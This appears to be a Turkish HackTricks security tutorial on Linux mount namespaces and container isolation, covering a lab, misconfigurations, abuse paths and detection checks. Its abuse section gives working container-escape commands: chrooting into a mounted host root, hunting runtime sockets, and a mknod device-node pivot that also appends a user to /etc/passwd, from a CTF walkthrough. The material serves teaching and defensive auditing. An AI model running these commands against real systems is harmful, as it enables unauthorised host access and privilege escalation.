# Mount Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Genel Bakış

Mount namespace, bir process'in gördüğü **mount table**'ı kontrol eder. Bu, en önemli container isolation özelliklerinden biridir; çünkü root filesystem, bind mounts, tmpfs mounts, procfs görünümü, sysfs erişimi ve runtime'a özgü birçok yardımcı mount, bu mount table üzerinden ifade edilir. İki process `/`, `/proc`, `/sys` veya `/tmp` yollarına erişebilse de bu yolların neye çözümlendiği, içinde bulundukları mount namespace'e bağlıdır.

Container security açısından mount namespace, çoğu zaman "bu, düzgün şekilde hazırlanmış bir application filesystem" ile "bu process, host filesystem'ını doğrudan görebilir veya etkileyebilir" arasındaki farktır. Bu nedenle bind mounts, `hostPath` volumes, privileged mount operations ve writable `/proc` veya `/sys` erişimleri bu namespace etrafında şekillenir.

## İşleyiş

Bir runtime container başlattığında genellikle yeni bir mount namespace oluşturur, container için bir root filesystem hazırlar, gerektiğinde procfs ve diğer yardımcı filesystem'ları mount eder ve ardından isteğe bağlı olarak bind mounts, tmpfs mounts, secrets, config maps veya host paths ekler. Process namespace içinde çalışmaya başladıktan sonra gördüğü mount kümesi, büyük ölçüde host'un varsayılan görünümünden ayrılmış olur. Host gerçek underlying filesystem'ı görmeye devam edebilir; ancak container, runtime tarafından kendisi için oluşturulan sürümü görür.

Bu güçlü bir özelliktir; çünkü host hâlâ her şeyi yönetiyor olsa da container'ın kendi root filesystem'ına sahip olduğuna inanmasını sağlar. Ancak runtime yanlış mount'ı expose ederse bu durum tehlikeli hâle gelir; process aniden host kaynaklarını görebilir ve security model'in geri kalanı bu kaynakları koruyacak şekilde tasarlanmamış olabilir.

## Laboratuvar

Şu komutla private bir mount namespace oluşturabilirsiniz:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Başka bir shell'i bu namespace'in dışında açıp mount table'ı incelerseniz, tmpfs mount'ının yalnızca izole edilmiş mount namespace içinde mevcut olduğunu görürsünüz. Bu, mount isolation'ın soyut bir teori olmadığını gösterdiği için yararlı bir egzersizdir; kernel, process'e kelimenin tam anlamıyla farklı bir mount table sunar.

Başka bir shell'i bu namespace'in dışında açıp mount table'ı incelerseniz, tmpfs mount'ı yalnızca izole edilmiş mount namespace içinde mevcut olacaktır.

Container'ların içinde hızlı bir karşılaştırma şöyledir:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
İkinci örnek, bir runtime yapılandırmasının filesystem sınırında nasıl kolayca büyük bir açık oluşturabileceğini gösterir.

## Runtime Kullanımı

Docker, Podman, containerd tabanlı stack'ler ve CRI-O, normal container'lar için private mount namespace'e dayanır. Kubernetes, volume'ler, projected secret'lar, config map'ler ve `hostPath` mount'ları için aynı mekanizmayı temel alır. Incus/LXC ortamları da özellikle system container'lar application container'larına kıyasla daha zengin ve makine benzeri filesystem'ler sunduğundan mount namespace'lerine büyük ölçüde dayanır.

Bu, bir container filesystem sorununu incelerken genellikle izole bir Docker tuhaflığıyla karşı karşıya olmadığınız anlamına gelir. Karşınızdaki, workload'u başlatan platform üzerinden ifade edilen bir mount namespace ve runtime yapılandırması sorunudur.

## Yanlış Yapılandırmalar

En açık ve tehlikeli hata, host root filesystem'ini veya başka bir hassas host path'ini bir bind mount üzerinden dışa açmaktır; örneğin `-v /:/host` veya Kubernetes'te writable bir `hostPath`. Bu noktada soru artık "container bir şekilde escape edebilir mi?" değil, "hangi yararlı host içeriği zaten doğrudan görülebilir ve yazılabilir?" olur. Writable bir host bind mount, exploit'in geri kalanını çoğu zaman basit bir file placement, chrooting, config modification veya runtime socket discovery işlemine dönüştürür.

Bir diğer yaygın sorun, host `/proc` veya `/sys` dosyasistemlerini daha güvenli container görünümünü bypass edecek şekilde dışa açmaktır. Bu filesystem'ler sıradan data mount'ları değildir; kernel ve process state'e açılan arayüzlerdir. Workload doğrudan host sürümlerine erişebiliyorsa container hardening'in dayandığı varsayımların çoğu artık düzgün şekilde uygulanamaz.

Read-only korumalar da önemlidir. Read-only bir root filesystem container'ı sihirli biçimde güvenli hale getirmez; ancak attacker staging alanının büyük bir kısmını ortadan kaldırır ve persistence, helper-binary placement ve config tampering işlemlerini zorlaştırır. Buna karşılık writable bir root veya writable bir host bind mount, attacker's bir sonraki adımı hazırlaması için alan sağlar.

## Kötüye Kullanım

Mount namespace yanlış kullanıldığında attacker'lar genellikle dört işlemden birini yapar. Container dışında kalması gereken **host data'yı okurlar**. Writable bind mount'lar üzerinden **host configuration'ını değiştirirler**. Capabilities ve seccomp izin veriyorsa **ek kaynakları mount veya remount ederler**. Ya da container platformundan daha fazla erişim istemelerini sağlayan **güçlü socket'lere ve runtime state directory'lerine ulaşırlar**.

Container host filesystem'ini zaten görebiliyorsa security model'in geri kalanı hemen değişir.

Bir host bind mount'ından şüphelendiğinizde öncelikle hangi kaynakların kullanılabildiğini ve bunların writable olup olmadığını doğrulayın:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Host root filesystem read-write olarak mount edilmişse, host'a doğrudan erişim çoğu zaman şu kadar basittir:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Hedef doğrudan chrooting yerine ayrıcalıklı runtime erişimiyse, soketleri ve runtime durumunu listeleyin:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
`CAP_SYS_ADMIN` mevcutsa, container içinden yeni mount'ların oluşturulup oluşturulamayacağını da test edin:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Tam Örnek: Two-Shell `mknod` Pivot

Container root kullanıcısının block device oluşturabildiği, host ve container'ın yararlı bir şekilde aynı kullanıcı kimliğini paylaştığı ve attacker'ın host üzerinde zaten düşük yetkili bir foothold elde ettiği durumlarda daha specialized bir abuse path ortaya çıkar. Bu durumda container, `/dev/sda` gibi bir device node oluşturabilir ve düşük yetkili host kullanıcısı, eşleşen container process'i için `/proc/<pid>/root/` üzerinden bunu daha sonra okuyabilir.

Container içinde:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Host üzerinden, container shell PID'sini bulduktan sonra karşılık gelen düşük ayrıcalıklı kullanıcı olarak:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Önemli ders, tam olarak CTF string search işlemi değildir. Asıl önemli nokta, `/proc/<pid>/root/` üzerinden mount-namespace exposure durumunun, cgroup device policy container içinde doğrudan kullanımı engellemiş olsa bile, bir host kullanıcısının container tarafından oluşturulan device nodes'ları yeniden kullanmasına olanak tanıyabilmesidir.

## Kontroller

Bu komutlar, mevcut process'in gerçekte içinde bulunduğu filesystem view'ını göstermek içindir. Amaç; host kaynaklı mount'ları, yazılabilir hassas path'leri ve normal bir application container root filesystem'ından daha geniş görünen her şeyi tespit etmektir.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Burada ilgi çekici olanlar:

- Host üzerinden yapılan bind mount'lar, özellikle `/`, `/proc`, `/sys`, runtime state dizinleri veya socket konumları hemen dikkat çekmelidir.
- Beklenmeyen read-write mount'lar, genellikle çok sayıdaki read-only yardımcı mount'tan daha önemlidir.
- Bir yolun gerçekten host kaynaklı mı yoksa overlay-backed mi olduğunu görmek için `mountinfo` genellikle en iyi yerdir.

Bu kontroller, **bu namespace içinde hangi kaynakların görünür olduğunu**, **hangilerinin host kaynaklı olduğunu** ve **hangilerinin yazılabilir veya security-sensitive olduğunu** belirler.
{{#include ../../../../../banners/hacktricks-training.md}}
